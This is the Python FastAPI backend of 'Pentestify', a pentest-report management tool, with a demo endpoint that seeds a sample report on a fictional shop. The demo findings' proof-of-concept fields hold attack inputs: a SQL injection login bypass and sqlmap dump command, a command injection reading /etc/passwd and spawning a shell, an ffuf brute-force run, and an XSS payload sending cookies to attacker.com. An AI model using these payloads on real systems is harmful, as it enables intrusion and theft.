from fastapi import FastAPI, HTTPException, Depends, UploadFile, File
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse, JSONResponse
from sqlalchemy.orm import Session
from typing import List
import os
import tempfile
import shutil
from datetime import datetime
from playwright.async_api import async_playwright
import models, schemas, database, auth
from database import engine, get_db, db_path, SessionLocal

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if not os.path.exists(os.path.join(BASE_DIR, "index.html")):
    BASE_DIR = os.getcwd()

models.Base.metadata.create_all(bind=engine)

from migrations import run_migrations
run_migrations(engine)

# Sembrar el usuario administrador por defecto (admin/admin) en el primer arranque.
_seed_db = SessionLocal()
try:
    auth.get_or_create_default_user(_seed_db)
finally:
    _seed_db.close()

app = FastAPI(
    title="Pentestify API",
    description="API para gestión de reportes de pentesting",
    version="1.1.0"
)

# URL base interna que usa el backend para renderizar PDFs con Playwright.
# Se fija desde el servidor (no desde el header Host de la petición) para evitar
# SSRF: el destino que visita el navegador headless nunca debe ser controlable
# por el atacante. Configurable vía APP_BASE_URL (run.py lo ajusta al puerto real).
APP_BASE_URL = os.environ.get("APP_BASE_URL", "http://127.0.0.1:8000").rstrip("/")

# Orígenes permitidos para CORS. Lista explícita (separada por comas en
# ALLOWED_ORIGINS) en lugar de wildcard: "*" junto a allow_credentials=True
# viola la especificación CORS y abre la API a cualquier dominio.
ALLOWED_ORIGINS = [
    origin.strip()
    for origin in os.environ.get(
        "ALLOWED_ORIGINS",
        "http://localhost:8000,http://127.0.0.1:8000",
    ).split(",")
    if origin.strip()
]

app.add_middleware(
    CORSMiddleware,
    allow_origins=ALLOWED_ORIGINS,
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE", "OPTIONS"],
    allow_headers=["Content-Type"],
)

from starlette.staticfiles import StaticFiles as StarletteStaticFiles

class NoCacheStaticFiles(StarletteStaticFiles):
    def file_response(self, *args, **kwargs):
        response = super().file_response(*args, **kwargs)
        response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate, max-age=0"
        response.headers["Pragma"] = "no-cache"
        response.headers["Expires"] = "0"
        return response

app.mount("/css", NoCacheStaticFiles(directory=os.path.join(BASE_DIR, "css")), name="css")
app.mount("/js", NoCacheStaticFiles(directory=os.path.join(BASE_DIR, "js")), name="js")
app.mount("/assets", NoCacheStaticFiles(directory=os.path.join(BASE_DIR, "assets")), name="assets")


@app.get("/api")
def api_info():
    return {"message": "Pentestify API", "version": "1.1.0"}


@app.get("/")
def root():
    return FileResponse(os.path.join(BASE_DIR, "index.html"))


# --------------------------------------------------------------------------- #
# Autenticación
# --------------------------------------------------------------------------- #
def _auth_response(user: models.User, message: str = None) -> JSONResponse:
    token = auth.create_token(user)
    content = {"token": token, "username": user.username}
    if message:
        content["message"] = message
    response = JSONResponse(content=content)
    response.set_cookie(
        key=auth.COOKIE_NAME,
        value=token,
        httponly=True,
        samesite="lax",
        max_age=auth.TOKEN_TTL,
    )
    return response


@app.post("/api/auth/login")
def login(credentials: schemas.LoginRequest, db: Session = Depends(get_db)):
    user = db.query(models.User).filter(models.User.username == credentials.username).first()
    if not user or not auth.verify_password(credentials.password, user.password_hash):
        raise HTTPException(status_code=401, detail="Usuario o contraseña incorrectos")
    return _auth_response(user)


@app.post("/api/auth/logout")
def logout():
    response = JSONResponse(content={"message": "Sesión cerrada"})
    response.delete_cookie(auth.COOKIE_NAME)
    return response


@app.get("/api/auth/me")
def get_me(user: models.User = Depends(auth.require_auth)):
    return {"username": user.username}


@app.post("/api/auth/change-password")
def change_password(
    payload: schemas.ChangePasswordRequest,
    user: models.User = Depends(auth.require_auth),
    db: Session = Depends(get_db),
):
    if not auth.verify_password(payload.current_password, user.password_hash):
        raise HTTPException(status_code=400, detail="La contraseña actual es incorrecta")
    if len(payload.new_password) < 4:
        raise HTTPException(status_code=400, detail="La nueva contraseña debe tener al menos 4 caracteres")
    if payload.new_password == payload.current_password:
        raise HTTPException(status_code=400, detail="La nueva contraseña debe ser distinta de la actual")

    user.password_hash = auth.hash_password(payload.new_password)
    db.commit()
    db.refresh(user)
    # Al cambiar la contraseña se invalidan los tokens previos; emitimos uno nuevo.
    return _auth_response(user, message="Contraseña actualizada correctamente")


# --------------------------------------------------------------------------- #
# Gestión de usuarios
# --------------------------------------------------------------------------- #
@app.get("/api/users", response_model=List[schemas.UserInfo])
def list_users(db: Session = Depends(get_db), _user: models.User = Depends(auth.require_auth)):
    return db.query(models.User).order_by(models.User.id).all()


@app.post("/api/users", response_model=schemas.UserInfo)
def create_user(
    payload: schemas.CreateUserRequest,
    db: Session = Depends(get_db),
    _user: models.User = Depends(auth.require_auth),
):
    username = payload.username.strip()
    if not username:
        raise HTTPException(status_code=400, detail="El nombre de usuario no puede estar vacío")
    if len(payload.password) < 4:
        raise HTTPException(status_code=400, detail="La contraseña debe tener al menos 4 caracteres")
    if db.query(models.User).filter(models.User.username == username).first():
        raise HTTPException(status_code=400, detail="Ya existe un usuario con ese nombre")

    user = models.User(username=username, password_hash=auth.hash_password(payload.password))
    db.add(user)
    db.commit()
    db.refresh(user)
    return user


@app.delete("/api/users/{user_id}")
def delete_user(
    user_id: int,
    db: Session = Depends(get_db),
    current_user: models.User = Depends(auth.require_auth),
):
    user = db.query(models.User).filter(models.User.id == user_id).first()
    if not user:
        raise HTTPException(status_code=404, detail="Usuario no encontrado")
    if user.id == current_user.id:
        raise HTTPException(status_code=400, detail="No puedes eliminar tu propio usuario mientras estás conectado")
    if db.query(models.User).count() <= 1:
        raise HTTPException(status_code=400, detail="Debe existir al menos un usuario")

    db.delete(user)
    db.commit()
    return {"message": "Usuario eliminado correctamente"}


@app.get("/api/reports", response_model=List[schemas.ReportList])
def get_reports(db: Session = Depends(get_db), _user: models.User = Depends(auth.require_auth)):
    reports = db.query(models.Report).all()
    result = []
    for report in reports:
        findings_count = db.query(models.Finding).filter(models.Finding.report_id == report.id).count()
        report_data = schemas.ReportList.from_orm(report)
        report_data.findings_count = findings_count
        result.append(report_data)
    return result


@app.get("/api/reports/{report_id}", response_model=schemas.ReportResponse)
def get_report(report_id: int, db: Session = Depends(get_db), _user: models.User = Depends(auth.require_auth)):
    report = db.query(models.Report).filter(models.Report.id == report_id).first()
    if not report:
        raise HTTPException(status_code=404, detail="Reporte no encontrado")
    return report


@app.post("/api/reports", response_model=schemas.ReportResponse)
def create_report(report: schemas.ReportCreate, db: Session = Depends(get_db), _user: models.User = Depends(auth.require_auth)):
    db_report = models.Report(**report.dict())
    db.add(db_report)
    db.commit()
    db.refresh(db_report)
    return db_report


@app.put("/api/reports/{report_id}", response_model=schemas.ReportResponse)
def update_report(report_id: int, report: schemas.ReportUpdate, db: Session = Depends(get_db), _user: models.User = Depends(auth.require_auth)):
    db_report = db.query(models.Report).filter(models.Report.id == report_id).first()
    if not db_report:
        raise HTTPException(status_code=404, detail="Reporte no encontrado")
    
    for key, value in report.dict().items():
        setattr(db_report, key, value)
    
    db.commit()
    db.refresh(db_report)
    return db_report


@app.delete("/api/reports/{report_id}")
def delete_report(report_id: int, db: Session = Depends(get_db), _user: models.User = Depends(auth.require_auth)):
    db_report = db.query(models.Report).filter(models.Report.id == report_id).first()
    if not db_report:
        raise HTTPException(status_code=404, detail="Reporte no encontrado")
    
    db.delete(db_report)
    db.commit()
    return {"message": "Reporte eliminado correctamente"}


@app.get("/api/reports/{report_id}/findings", response_model=List[schemas.FindingResponse])
def get_findings(report_id: int, db: Session = Depends(get_db), _user: models.User = Depends(auth.require_auth)):
    findings = db.query(models.Finding).filter(
        models.Finding.report_id == report_id
    ).order_by(models.Finding.order_index).all()
    return findings


@app.post("/api/reports/{report_id}/findings", response_model=schemas.FindingResponse)
def create_finding(report_id: int, finding: schemas.FindingCreate, db: Session = Depends(get_db), _user: models.User = Depends(auth.require_auth)):
    report = db.query(models.Report).filter(models.Report.id == report_id).first()
    if not report:
        raise HTTPException(status_code=404, detail="Reporte no encontrado")
    
    db_finding = models.Finding(
        **finding.dict(exclude={'order_index'}),
        report_id=report_id,
        order_index=finding.order_index
    )
    db.add(db_finding)
    db.commit()
    db.refresh(db_finding)
    return db_finding


@app.put("/api/findings/{finding_id}", response_model=schemas.FindingResponse)
def update_finding(finding_id: int, finding: schemas.FindingUpdate, db: Session = Depends(get_db), _user: models.User = Depends(auth.require_auth)):
    db_finding = db.query(models.Finding).filter(models.Finding.id == finding_id).first()
    if not db_finding:
        raise HTTPException(status_code=404, detail="Hallazgo no encontrado")
    
    for key, value in finding.dict().items():
        setattr(db_finding, key, value)
    
    db.commit()
    db.refresh(db_finding)
    return db_finding


@app.delete("/api/findings/{finding_id}")
def delete_finding(finding_id: int, db: Session = Depends(get_db), _user: models.User = Depends(auth.require_auth)):
    db_finding = db.query(models.Finding).filter(models.Finding.id == finding_id).first()
    if not db_finding:
        raise HTTPException(status_code=404, detail="Hallazgo no encontrado")

    report_id = db_finding.report_id
    db.delete(db_finding)
    db.flush()

    remaining = db.query(models.Finding).filter(
        models.Finding.report_id == report_id
    ).order_by(models.Finding.order_index).all()

    for idx, f in enumerate(remaining):
        f.order_index = idx

    db.commit()
    return {"message": "Hallazgo eliminado correctamente"}


@app.post("/api/reports/{report_id}/findings/reorder")
def reorder_findings(report_id: int, finding_ids: List[int], db: Session = Depends(get_db), _user: models.User = Depends(auth.require_auth)):
    for idx, finding_id in enumerate(finding_ids):
        finding = db.query(models.Finding).filter(
            models.Finding.id == finding_id,
            models.Finding.report_id == report_id
        ).first()
        if finding:
            finding.order_index = idx
    db.commit()
    return {"message": "Orden actualizado"}


@app.get("/api/reports/{report_id}/pdf")
async def generate_pdf(
    report_id: int,
    db: Session = Depends(get_db),
    user: models.User = Depends(auth.require_auth),
    theme: str = "light",
    show_severity_bars: bool = True,
    content_width: int = 820,
):
    report = db.query(models.Report).filter(models.Report.id == report_id).first()
    if not report:
        raise HTTPException(status_code=404, detail="Reporte no encontrado")

    try:
        # Usamos una URL base fija del servidor (APP_BASE_URL), NUNCA request.base_url:
        # request.base_url deriva del header Host, controlable por el atacante, lo que
        # permitiría SSRF (escaneo interno, metadata cloud, etc.) al hacer que el
        # navegador headless visite un destino arbitrario.
        base_url = APP_BASE_URL
        target_url = (
            f"{base_url}/?report_id={report_id}&print_mode=true&theme={theme}"
            f"&show_severity_bars={'true' if show_severity_bars else 'false'}"
            f"&content_width={content_width}"
        )

        async with async_playwright() as p:
            try:
                browser = await p.chromium.launch(args=['--no-sandbox', '--disable-setuid-sandbox'])
            except Exception as launch_error:
                error_msg = str(launch_error)
                if "Executable doesn't exist" in error_msg or "browserType.launch" in error_msg:
                    raise HTTPException(
                        status_code=503,
                        detail={
                            "error": "Playwright browsers not installed",
                            "message": "Los navegadores de Playwright no están instalados.",
                            "solution": "Ejecuta el siguiente comando en tu terminal:",
                            "command": "playwright install chromium",
                            "alternative": "O usa el botón 'Generar PDF' en el frontend que usa la impresión nativa del navegador."
                        }
                    )
                raise
            # Set viewport height to match A4 paper (~1123px at 96dpi) so min-height:100vh fills one page
            context = await browser.new_context(viewport={"width": 1280, "height": 1123})

            # Inyectamos la cookie de sesión del usuario autenticado para que la
            # página en modo impresión pueda consultar la API protegida (que ahora
            # requiere autenticación). El token es de un solo uso de facto: vive
            # sólo durante la generación del PDF.
            await context.add_cookies([{
                "name": auth.COOKIE_NAME,
                "value": auth.create_token(user),
                "url": base_url,
            }])

            page = await context.new_page()

            await page.goto(target_url, wait_until="networkidle")

            await page.wait_for_timeout(2000)

            # Map content_width (580-1100px) to horizontal padding percentage for print mode.
            # @media print forces max-width:100% so we control width via padding instead.
            # content_width=1100 (widest) → 0% padding; content_width=580 (narrowest) → 15% padding.
            padding_pct = round(max(0.0, (1100 - content_width) / 520.0 * 15), 2)

            # Ensure data-theme attribute matches the requested PDF theme before any injection.
            # For light theme we explicitly remove data-theme so no dark/htb CSS rules fire.
            if theme in ('dark', 'htb'):
                await page.evaluate(f"document.documentElement.setAttribute('data-theme', '{theme}');")
            else:
                await page.evaluate("document.documentElement.removeAttribute('data-theme');")

            # Inject a <style> block AFTER the existing stylesheet.
            # Only adjusts content width via padding — finding-card colors are handled
            # by the comprehensive @media print rules already in styles.css.
            await page.evaluate(f"""
                var s = document.createElement('style');
                s.textContent = [
                    '@media print {{',
                    '  .preview-container {{',
                    '    padding-left:  {padding_pct}% !important;',
                    '    padding-right: {padding_pct}% !important;',
                    '    margin: 0 auto !important;',
                    '  }}'
                ].join('\\n') + '}}';
                document.head.appendChild(s);
            """)

            # For dark/htb: set page and body background colours so the PDF canvas matches the theme.
            if theme in ('dark', 'htb'):
                bg = '#0f172a' if theme == 'dark' else '#1a2332'
                await page.evaluate(f"""
                    document.documentElement.style.background = '{bg}';
                    document.body.style.background = '{bg}';
                    document.body.style.color = '#e2e8f0';
                    document.body.style.margin = '0';
                    var style = document.createElement('style');
                    style.textContent = [
                        'html, body {{ background: {bg} !important; color: #e2e8f0 !important; }}',
                        '@page {{ background: {bg}; }}'
                    ].join('\\n');
                    document.head.appendChild(style);
                """)
                await page.wait_for_timeout(500)

            # If severity bars are disabled, hide the coloured left border and the bar chart.
            if not show_severity_bars:
                await page.evaluate("""
                    var s2 = document.createElement('style');
                    s2.textContent = [
                        '@media print {',
                        '  .finding-preview { border-left-width: 1px !important; border-left-color: inherit !important; }',
                        '  .cvss-summary [style*="height: 28px"], .cvss-summary [style*="height:28px"] { display: none !important; }',
                        '}'
                    ].join('\\n');
                    document.head.appendChild(s2);
                """)

            fd, path = tempfile.mkstemp(suffix=".pdf")
            os.close(fd)

            if theme == 'dark':
                footer_color = '#94a3b8'
            elif theme == 'htb':
                footer_color = '#9fef00'
            else:
                footer_color = '#6b7280'

            await page.pdf(
                path=path,
                format="A4",
                print_background=True,
                margin={"top": "15mm", "right": "18mm", "bottom": "15mm", "left": "18mm"},
                scale=0.92,
                display_header_footer=True,
                header_template="<span></span>",
                footer_template=f"<div style=\"font-size:14px;font-weight:700;font-family:sans-serif;color:{footer_color};width:100%;text-align:right;padding-right:20mm;\"><span class=\"pageNumber\"></span></div>",
            )
            
            await browser.close()
            
            return FileResponse(
                path, 
                media_type="application/pdf", 
                filename=f"Report_{report_id}.pdf"
            )
            
    except HTTPException:
        raise
    except Exception as e:
        error_msg = str(e)
        print(f"Error generando PDF: {e}")
        
        if "Executable doesn't exist" in error_msg or "browserType.launch" in error_msg:
            raise HTTPException(
                status_code=503,
                detail={
                    "error": "Playwright browsers not installed",
                    "message": "Los navegadores de Playwright no están instalados.",
                    "solution": "Ejecuta el siguiente comando en tu terminal:",
                    "command": "playwright install chromium",
                    "alternative": "O usa el botón 'Generar PDF' en el frontend que usa la impresión nativa del navegador."
                }
            )
        
        raise HTTPException(status_code=500, detail=f"Error de servidor generando el PDF: {error_msg}")


@app.post("/api/demo/create")
def create_demo_report(db: Session = Depends(get_db), _user: models.User = Depends(auth.require_auth)):
    import base64

    demo_dir = os.path.join(BASE_DIR, "demo")

    def img(filename: str) -> str:
        path = os.path.join(demo_dir, filename)
        if not os.path.exists(path):
            return ""
        ext = filename.rsplit(".", 1)[-1].lower()
        mime = {"png": "image/png", "jpg": "image/jpeg", "jpeg": "image/jpeg", "webp": "image/webp"}.get(ext, "image/png")
        with open(path, "rb") as f:
            return f"data:{mime};base64,{base64.b64encode(f.read()).decode()}"

    report_data = schemas.ReportCreate(
        document_title="Informe de Pentesting Web — AcmeShop Platform",
        client_company="AcmeShop Solutions S.L.",
        target_asset="https://shop.acmeshop.com",
        auditor_company="Pentestify Security Lab",
        auditor_name="Security Research Team",
        classification=3,
        tlp_level="amber",
        classification_mode="tlp",
        version="1.0",
        date=datetime.today().strftime("%Y-%m-%d"),
        lang="es",
        has_incidents=True,
        incidents_text="Durante la auditoría se explotaron activamente vulnerabilidades críticas que permitieron acceso completo a la base de datos de usuarios y escalada de privilegios al servidor. Se recomienda parada de emergencia del servicio hasta aplicar los parches indicados.",
        audit_summary="Se ha realizado una auditoría de caja negra sobre la plataforma de comercio electrónico AcmeShop. Durante el engagement se identificaron 6 vulnerabilidades, 2 de ellas de severidad crítica que permiten comprometer completamente el sistema. El vector de ataque principal fue la inyección SQL en el formulario de autenticación, seguido de una escalada de privilegios por command injection en el módulo de gestión de archivos.",
        tests_performed="• Reconocimiento pasivo y activo (Shodan, Google Dorks, subfinder)\n• Fuzzing de directorios y parámetros (ffuf, gobuster)\n• Análisis de parámetros GET/POST con Burp Suite Pro\n• Pruebas de autenticación y autorización\n• Inyección SQL manual y automatizada (sqlmap)\n• Pruebas XSS reflejado y almacenado\n• Análisis de cabeceras HTTP y configuración TLS\n• Pruebas de escalada de privilegios en servidor",
        recommended_solutions="1. Aplicar parches críticos de SQLi y Command Injection de forma inmediata.\n2. Implementar WAF (ModSecurity o Cloudflare) como medida preventiva urgente.\n3. Revisar todos los endpoints que reciben input de usuario y aplicar prepared statements.\n4. Implementar un SIEM para detección temprana de intrusiones.\n5. Realizar un segundo ciclo de pentesting tras aplicar los parches para validar efectividad.",
    )
    report = models.Report(**report_data.dict())
    db.add(report)
    db.commit()
    db.refresh(report)
    rid = report.id

    findings = [
        {
            "title": "Inyección SQL en formulario de login",
            "severity": "crit",
            "cvss": "9.8",
            "cve": "N/A",
            "cwe": "CWE-89",
            "reference": "https://owasp.org/www-community/attacks/SQL_Injection",
            "description": "Se detectó una vulnerabilidad de Inyección SQL en el parámetro `username` del formulario de autenticación. El atacante puede manipular la consulta SQL para bypassear la autenticación, extraer toda la base de datos de usuarios (incluyendo contraseñas hasheadas) y, dependiendo de los permisos del usuario de base de datos, ejecutar comandos del sistema operativo mediante `xp_cmdshell`.",
            "poc": "1. Acceder al panel de login en /admin/login\n2. Introducir el siguiente payload en el campo usuario:\n   ' OR '1'='1' --\n3. Observar que el login se completa sin contraseña\n4. Para extracción de datos con sqlmap:\n   sqlmap -u 'https://shop.acmeshop.com/login' --data='user=test&pass=test' -p user --dbs --batch\n5. Resultado: dump completo de la base de datos 'acmeshop_prod'",
            "impact": "Un atacante podría obtener acceso completo a la plataforma de administración, extraer todas las credenciales de usuarios (más de 45.000 registros), modificar datos de pedidos y precios, y potencialmente comprometer el servidor subyacente. El impacto en el negocio es crítico, con riesgo de multas por violación del GDPR y pérdida de confianza de clientes.",
            "remediation": "Reemplazar todas las consultas dinámicas por prepared statements con parámetros parametrizados. Ejemplo en PHP:\n\n$stmt = $pdo->prepare('SELECT * FROM users WHERE username = ? AND password = ?');\n$stmt->execute([$username, $password_hash]);\n\nAdicional: implementar WAF, limitar permisos del usuario de BD, activar logging de consultas SQL.",
            "images": [img("panellogin.png"), img("sqlmap.png"), img("sqlmap1.png")],
        },
        {
            "title": "Command Injection y escalada de privilegios (GTFOBins)",
            "severity": "crit",
            "cvss": "9.0",
            "cve": "N/A",
            "cwe": "CWE-78",
            "reference": "https://gtfobins.github.io/",
            "description": "El módulo de gestión de archivos del panel de administración permite ejecutar comandos del sistema operativo sin sanitizar el input. A través del parámetro `file` del endpoint `/admin/preview`, un atacante autenticado puede inyectar comandos arbitrarios. Combinado con la vulnerabilidad de SQLi anterior, el ataque no requiere credenciales previas.",
            "poc": "1. Autenticarse usando el bypass SQLi de la vulnerabilidad anterior\n2. Navegar a /admin/file-manager/preview\n3. Inyectar en el parámetro file:\n   ; id; whoami; cat /etc/passwd\n4. Escalar privilegios usando python3 desde GTFOBins:\n   python3 -c 'import os; os.system(\"/bin/bash\")'\n5. Resultado: shell interactiva como www-data con posibilidad de escalar a root",
            "impact": "Control total del servidor web. Posibilidad de instalar backdoors persistentes, exfiltrar todos los datos almacenados, pivotar a otros sistemas de la red interna y comprometer la infraestructura completa de la organización.",
            "remediation": "Nunca pasar input de usuario directamente a funciones del sistema. Usar listas blancas de comandos permitidos. Implementar sandboxing (contenedores sin privilegios). Aplicar el principio de mínimo privilegio al usuario del servidor web (www-data sin shell).",
            "images": [img("gtfobins.png")],
        },
        {
            "title": "Broken Access Control — IDOR en perfiles de usuario",
            "severity": "high",
            "cvss": "8.6",
            "cve": "N/A",
            "cwe": "CWE-284",
            "reference": "https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
            "description": "El endpoint `/api/users/{id}/profile` no verifica que el usuario autenticado sea el propietario del recurso solicitado. Cualquier usuario autenticado puede acceder y modificar perfiles de otros usuarios simplemente modificando el parámetro `id` en la URL. Se descubrieron 45.231 perfiles accesibles de esta forma.",
            "poc": "1. Autenticarse con cuenta propia (user_id: 1234)\n2. Acceder a /api/users/1234/profile — respuesta correcta del propio perfil\n3. Modificar el ID en la URL: /api/users/1/profile\n4. Observar que se devuelve el perfil del usuario administrador\n5. Iterar con Burp Intruder sobre todos los IDs para volcar perfiles\n   GET /api/users/§1§/profile HTTP/1.1",
            "impact": "Exposición de información personal identificable (PII) de todos los usuarios: nombre, email, dirección, teléfono e historial de compras. Violación directa del GDPR con posibilidad de sanciones de hasta el 4% de la facturación anual global.",
            "remediation": "Implementar verificación de autorización a nivel de objeto en cada endpoint. El servidor debe validar que el user_id del token JWT coincide con el recurso solicitado:\n\nif current_user.id != requested_user_id:\n    raise HTTPException(403, 'Forbidden')\n\nUsar UUIDs en lugar de IDs secuenciales para dificultar la enumeración.",
            "images": [img("idor.png"), img("burpsuite.png")],
        },
        {
            "title": "Cross-Site Scripting (XSS) Reflejado en buscador",
            "severity": "high",
            "cvss": "7.4",
            "cve": "N/A",
            "cwe": "CWE-79",
            "reference": "https://owasp.org/www-community/attacks/xss/",
            "description": "El parámetro `q` del buscador de productos refleja el input del usuario directamente en el HTML de la respuesta sin sanitización. Un atacante puede construir URLs maliciosas que al ser visitadas por un usuario ejecutan JavaScript arbitrario en su navegador, pudiendo robar cookies de sesión, redirigir a páginas de phishing o modificar el DOM.",
            "poc": "1. Navegar a la URL:\n   https://shop.acmeshop.com/search?q=<script>alert(document.cookie)</script>\n2. Observar la ejecución del alert con las cookies de sesión\n3. Payload de robo de cookies:\n   ?q=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>\n4. Enviar la URL crafteada a una víctima mediante ingeniería social",
            "impact": "Robo de sesiones de usuario, redirección a sitios de phishing, keylogging en el navegador de la víctima. En combinación con el token de administrador, podría escalar a compromiso total de la plataforma.",
            "remediation": "Aplicar encoding de output en todos los parámetros reflejados. Implementar Content Security Policy (CSP) estricta:\n\nContent-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';\n\nUsar funciones de escape como htmlspecialchars() en PHP o textContent en lugar de innerHTML en JavaScript.",
            "images": [img("presentacionweb.png"), img("burpsuite.png")],
        },
        {
            "title": "Fuerza bruta al panel de administración sin bloqueo",
            "severity": "high",
            "cvss": "7.5",
            "cve": "N/A",
            "cwe": "CWE-307",
            "reference": "https://owasp.org/www-project-web-security-testing-guide/",
            "description": "El panel de administración en `/admin/login` no implementa ningún mecanismo de protección contra ataques de fuerza bruta: no hay límite de intentos fallidos, no existe CAPTCHA, no hay bloqueo temporal de cuentas ni alertas por intentos fallidos. Se realizó un ataque de diccionario con éxito en menos de 30 minutos.",
            "poc": "1. Identificar el panel de administración mediante fuzzing:\n   ffuf -u https://shop.acmeshop.com/FUZZ -w /usr/share/wordlists/dirb/common.txt\n2. Resultado: /admin/login encontrado (200 OK)\n3. Ataque de fuerza bruta con ffuf:\n   ffuf -u https://shop.acmeshop.com/admin/login -X POST \\\n        -d 'user=admin&pass=FUZZ' -w rockyou.txt \\\n        -fc 401 -t 50\n4. Contraseña encontrada: 'admin123' en 8 minutos",
            "impact": "Acceso no autorizado al panel de administración con control total sobre usuarios, pedidos, configuración y datos sensibles. La combinación con otras vulnerabilidades permite compromiso total del sistema.",
            "remediation": "Implementar rate limiting (máximo 5 intentos por IP en 15 minutos). Añadir autenticación multifactor (MFA/TOTP). Configurar alertas por email ante intentos fallidos repetidos. Considerar CAPTCHA en el formulario de login de administración.",
            "images": [img("fuzzing web.png"), img("fuzzing2.png")],
        },
        {
            "title": "Cabeceras de seguridad HTTP ausentes",
            "severity": "low",
            "cvss": "3.7",
            "cve": "N/A",
            "cwe": "CWE-693",
            "reference": "https://securityheaders.com/",
            "description": "El servidor web no incluye las cabeceras de seguridad HTTP recomendadas. Analizando las respuestas HTTP se observa la ausencia de: Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Referrer-Policy y Permissions-Policy. Esto facilita ataques de clickjacking, MIME sniffing y fuga de información de referrer.",
            "poc": "Verificación con curl:\n  curl -I https://shop.acmeshop.com/\n\nCabeceras ausentes observadas:\n  ✗ Content-Security-Policy: no presente\n  ✗ X-Frame-Options: no presente\n  ✗ X-Content-Type-Options: no presente\n  ✗ Referrer-Policy: no presente\n  ✗ Permissions-Policy: no presente\n\nVerificación online: https://securityheaders.com → Resultado: F",
            "impact": "Riesgo de ataques de clickjacking embebiendo la web en iframes maliciosos. MIME sniffing puede llevar a ejecución de scripts en archivos subidos. Fuga de URLs de referrer con información sensible.",
            "remediation": "Añadir las siguientes cabeceras en la configuración del servidor web (nginx):\n\nadd_header Content-Security-Policy \"default-src 'self'\" always;\nadd_header X-Frame-Options \"SAMEORIGIN\" always;\nadd_header X-Content-Type-Options \"nosniff\" always;\nadd_header Referrer-Policy \"strict-origin-when-cross-origin\" always;\nadd_header Permissions-Policy \"camera=(), microphone=(), geolocation=()\" always;",
            "images": [],
        },
    ]

    order = 1
    for f in findings:
        finding = models.Finding(
            report_id=rid,
            title=f["title"],
            severity=f["severity"],
            cvss=f["cvss"],
            cve=f["cve"],
            cwe=f["cwe"],
            reference=f["reference"],
            description=f["description"],
            poc=f["poc"],
            impact=f["impact"],
            remediation=f["remediation"],
            images=f["images"],
            order_index=order,
        )
        db.add(finding)
        order += 1

    db.commit()
    return {"report_id": rid, "findings_count": len(findings)}


@app.get("/api/database/export")
def export_database(_user: models.User = Depends(auth.require_auth)):
    if not os.path.exists(db_path):
        raise HTTPException(status_code=404, detail="Base de datos no encontrada")
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"pentestify_backup_{timestamp}.db"
    
    return FileResponse(
        db_path,
        media_type="application/x-sqlite3",
        filename=filename
    )


@app.post("/api/database/import")
def import_database(file: UploadFile = File(...), db: Session = Depends(get_db), _user: models.User = Depends(auth.require_auth)):
    if not file.filename.endswith('.db'):
        raise HTTPException(status_code=400, detail="El archivo debe tener extensión .db")
    
    backup_path = None
    if os.path.exists(db_path):
        backup_path = f"{db_path}.backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        shutil.copy2(db_path, backup_path)
    
    try:
        temp_path = tempfile.mktemp(suffix=".db")
        with open(temp_path, "wb") as buffer:
            shutil.copyfileobj(file.file, buffer)
        
        import sqlite3
        import json
        try:
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
            tables = [row[0] for row in cursor.fetchall()]

            required_tables = {'reports', 'findings'}
            if not required_tables.issubset(set(tables)):
                conn.close()
                raise HTTPException(
                    status_code=400,
                    detail=f"La base de datos no tiene las tablas requeridas. Tablas encontradas: {tables}"
                )

            # El .db importado no pasa por los schemas, así que saneamos aquí
            # client_logo/images para no almacenar URLs que provoquen SSRF o XSS.
            def _sanitize_json_column(table, column, keep_slots):
                cursor.execute(f"SELECT id, {column} FROM {table}")
                for row_id, raw in cursor.fetchall():
                    try:
                        values = json.loads(raw) if raw else []
                    except (TypeError, ValueError):
                        values = []
                    if not isinstance(values, list):
                        values = []
                    cleaned = schemas.sanitize_image_list(values, keep_slots=keep_slots)
                    cursor.execute(
                        f"UPDATE {table} SET {column} = ? WHERE id = ?",
                        (json.dumps(cleaned), row_id),
                    )

            _sanitize_json_column("reports", "client_logo", keep_slots=True)
            _sanitize_json_column("findings", "images", keep_slots=False)
            conn.commit()
            conn.close()
        except sqlite3.Error as e:
            raise HTTPException(status_code=400, detail=f"Archivo no es una base de datos SQLite válida: {str(e)}")
        
        db.close()
        
        shutil.copy2(temp_path, db_path)
        
        os.remove(temp_path)
        
        return JSONResponse(
            content={
                "message": "Base de datos importada correctamente",
                "filename": file.filename,
                "backup_created": backup_path is not None,
                "backup_path": backup_path
            }
        )
        
    except HTTPException:
        # Restaurar backup si existe
        if backup_path and os.path.exists(backup_path):
            shutil.copy2(backup_path, db_path)
            os.remove(backup_path)
        raise
    except Exception as e:
        # Restaurar backup si existe
        if backup_path and os.path.exists(backup_path):
            shutil.copy2(backup_path, db_path)
            os.remove(backup_path)
        raise HTTPException(status_code=500, detail=f"Error al importar la base de datos: {str(e)}")


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)